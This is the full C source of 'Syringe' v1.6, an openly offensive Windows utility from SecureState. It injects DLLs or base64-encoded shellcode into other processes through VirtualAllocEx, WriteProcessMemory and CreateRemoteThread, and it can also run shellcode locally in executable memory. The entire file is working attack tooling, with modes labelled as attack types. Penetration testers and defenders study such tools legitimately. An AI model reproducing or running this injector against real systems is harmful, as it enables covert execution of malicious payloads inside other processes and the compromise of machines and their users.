/*
 * syringe.c v1.6
 * A General Purpose DLL & Code Injection Utility
 * Author: Spencer McIntyre (Steiner) <smcintyre [at] securestate [dot] com>
 *
 *
 * Copyright (c) 2011-2015, SecureState LLC
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are
 * met:
 *
 *  * Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 *  * Redistributions in binary form must reproduce the above
 *    copyright notice, this list of conditions and the following disclaimer
 *    in the documentation and/or other materials provided with the
 *    distribution.
 *  * Neither the name of the project nor the names of its
 *    contributors may be used to endorse or promote products derived from
 *    this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <Windows.h>
#include <WinCrypt.h>
#include <conio.h>
#include <stdio.h>
#include <tlhelp32.h>

#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
#define REMOTE_ASSEMBLY_STUB_LENGTH_RELEASE 3

#define MAXLINE 512
#define ATTACK_TYPE_DLL_INJECTION 1
#define ATTACK_TYPE_SHELL_CODE_INJECTION 2
#define ATTACK_TYPE_EXECUTE_SHELL_CODE 3
#define ATTACK_TYPE_DLL_LOAD 4

#ifdef _M_X64
#define APPLICATION_NAME "Syringe v1.6 x64"
#else
#define APPLICATION_NAME "Syringe v1.6 x86"
#endif

#define USAGE_STRING	"A General Purpose DLL & Code Injection Utility\n"\
						"\n"\
						"Usage:\n"\
						"  Inject DLL:\n"\
						"    syringe.exe -1 [ dll ] [ pid ]\n"\
						"\n"\
						"  Inject Shellcode:\n"\
						"    syringe.exe -2 [ shellcode ] [ pid ]\n"\
						"\n"\
						"  Execute Shellcode:\n"\
						"    syringe.exe -3 [ shellcode ]\n"\
						"\n"\
						"  Load A Library:\n"\
						"    syringe.exe -4 [ dll ]\n"

//#include "syringe_core.h"
DWORD WINAPI LocalExecPayloadStub(LPVOID lpParameter);

DWORD InjectDLL(PCHAR pDll, DWORD dwProcessID) {
	HANDLE hProc;
	HANDLE hRemoteThread;
	LPVOID pRemoteBuffer;
	LPVOID pLoadLibAddr;

	if(!dwProcessID) {
		return 1;
	}
	hProc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, dwProcessID);
	if(!hProc) {
		return 2;
	}

	pLoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (!pLoadLibAddr) {
		return 3;
	}
	pRemoteBuffer = VirtualAllocEx(hProc, NULL, strlen(pDll), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if (!pRemoteBuffer) {
		return 4;
	}

	if (!WriteProcessMemory(hProc, pRemoteBuffer, pDll, strlen(pDll), NULL)) {
		return 5;
	}
	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibAddr, pRemoteBuffer, 0, NULL);
	if (!hRemoteThread) {
		return 6;
	}
	CloseHandle(hProc);
	return 0;
}

DWORD InjectShellcode(PBYTE pShellcode, SIZE_T szShellcodeLength, DWORD dwProcessID) {
	HANDLE hProc;
	HANDLE hRemoteThread;
	PVOID pRemoteBuffer;

	// Step 1, get a handle to a process
	if(!dwProcessID) {
		return 1;
	}
	hProc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, dwProcessID);
	if(!hProc) {
		return 2;
	}

	// Step 2, write the shellcode to the remote process
	pRemoteBuffer = VirtualAllocEx(hProc, NULL, szShellcodeLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!pRemoteBuffer) {
		return 4;
	}
	if (!WriteProcessMemory(hProc, pRemoteBuffer, pShellcode, szShellcodeLength, NULL)) {
		return 5;
	}

	// Step 3, start the assembly stub in via a call to CreateRemoteThread()
	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
	if (!hRemoteThread) {
		return 6;
	}
	CloseHandle(hProc);

	// Step 4, Profit.
	return 0;
}

DWORD ExecuteShellcode(PBYTE pShellcode, SIZE_T szShellcodeLength, BOOL quiet) {
	HANDLE hLocalThread;
	DWORD dwThreadId;
	PVOID pBuffer;

	pBuffer = VirtualAlloc(NULL, szShellcodeLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	memcpy(pBuffer, pShellcode, szShellcodeLength);
	hLocalThread = CreateThread(NULL, 0, LocalExecPayloadStub, pBuffer, 0, &dwThreadId);

	if (!quiet) {
		printf("Waiting for the shellcode to return... ");
	}
	WaitForSingleObject(hLocalThread, INFINITE);
	if (!quiet) {
		printf("Done.\n");
	}
	VirtualFree(pBuffer, 0, MEM_RELEASE);
	return 0;
}

DWORD WINAPI LocalExecPayloadStub(LPVOID lpParameter) {
	VOID(*lpCode)() = (VOID(*)())lpParameter;
	lpCode();

	return 0;
}


int main(int argc, char* argv[]) {
	CHAR pDllPath[MAXLINE] = "";
	DWORD dwPid = 0;
	DWORD dwResult = 0;
	DWORD dwAttackType = 0;
	DWORD dwNumArgs = 4;
	PBYTE pShellcode = NULL;
	DWORD dwShellcodeLength = 0;
	HANDLE hModule = NULL;

	printf("%s\n", APPLICATION_NAME);
	if (argc < 2) {
		printf(USAGE_STRING);
		return 0;
	}

	if (strncmp(argv[1], "-1", 2) == 0) {
		dwAttackType = ATTACK_TYPE_DLL_INJECTION;
	}
	else if (strncmp(argv[1], "-2", 2) == 0) {
		dwAttackType = ATTACK_TYPE_SHELL_CODE_INJECTION;
	}
	else if (strncmp(argv[1], "-3", 2) == 0) {
		dwAttackType = ATTACK_TYPE_EXECUTE_SHELL_CODE;
		dwNumArgs = 3;
	}
	else if (strncmp(argv[1], "-4", 2) == 0) {
		dwAttackType = ATTACK_TYPE_DLL_LOAD;
		dwNumArgs = 3;
	} else {
		printf(USAGE_STRING);
		return 0;
	}
	if (argc != dwNumArgs) {
		printf(USAGE_STRING);
		return 0;
	}

	if ((dwAttackType == ATTACK_TYPE_SHELL_CODE_INJECTION) || (dwAttackType == ATTACK_TYPE_EXECUTE_SHELL_CODE)) {
		if (!CryptStringToBinaryA(argv[2], 0, CRYPT_STRING_BASE64, pShellcode, &dwShellcodeLength, 0, NULL)) {
			printf("Failed to decode the provided shellcode\n");
			return 0;
		}
		pShellcode = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwShellcodeLength);
		if (pShellcode == NULL) {
			printf("Failed to allocate space for the shellcode\n");
			return 0;
		}
		if (!CryptStringToBinaryA(argv[2], 0, CRYPT_STRING_BASE64, pShellcode, &dwShellcodeLength, 0, NULL)) {
			printf("Failed to decode the provided shellcode\n");
			return 0;
		}
	}

	if ((dwAttackType == ATTACK_TYPE_DLL_INJECTION) || (dwAttackType == ATTACK_TYPE_SHELL_CODE_INJECTION)) {
		dwPid = atoi(argv[3]);
		if (!dwPid) {
			printf("Invalid Process ID.\n");
			return 0;
		}
		if (dwAttackType == ATTACK_TYPE_DLL_INJECTION) {
			GetFullPathNameA(argv[2], MAXLINE, pDllPath, NULL);
			dwResult = InjectDLL(pDllPath, dwPid);
		}
		else if (dwAttackType == ATTACK_TYPE_SHELL_CODE_INJECTION) {
			dwResult = InjectShellcode(pShellcode, (SIZE_T)dwShellcodeLength, dwPid);
		}

		if (dwResult == 0) {
			printf("Successfully Injected.\n");
		}
		else {
			printf("Failed To Inject.\nError: ");
			switch (dwResult) {
				case 1: { printf("Invalid Process ID\n"); break; }
				case 2: { printf("Could Not Open A Handle To The Process\n"); break; }
				case 3: { printf("Could Not Get The Address Of LoadLibraryA\n"); break; }
				case 4: { printf("Could Not Allocate Memory In Remote Process\n"); break; }
				case 5: { printf("Could Not Write To Remote Process\n"); break; }
				case 6: { printf("Could Not Start The Remote Thread\n"); break; }
			}
		}
	}
	else if (dwAttackType == ATTACK_TYPE_EXECUTE_SHELL_CODE) {
		ExecuteShellcode(pShellcode, (SIZE_T)dwShellcodeLength, FALSE);
	}
	else if (dwAttackType == ATTACK_TYPE_DLL_LOAD) {
		hModule = LoadLibrary(argv[2]);
		if (!hModule) {
			printf("Failed to load: %s\n", argv[2]);
		}
		else {
			printf("Successfully loaded: %s\n", argv[2]);
			printf("Press any key to exit...\n");
			_getch();
		}
	}

	if (pShellcode) {
		HeapFree(GetProcessHeap(), 0, pShellcode);
		pShellcode = NULL;
	}
	if (hModule) {
		FreeLibrary(hModule);
		hModule = NULL;
	}
	return 0;
}

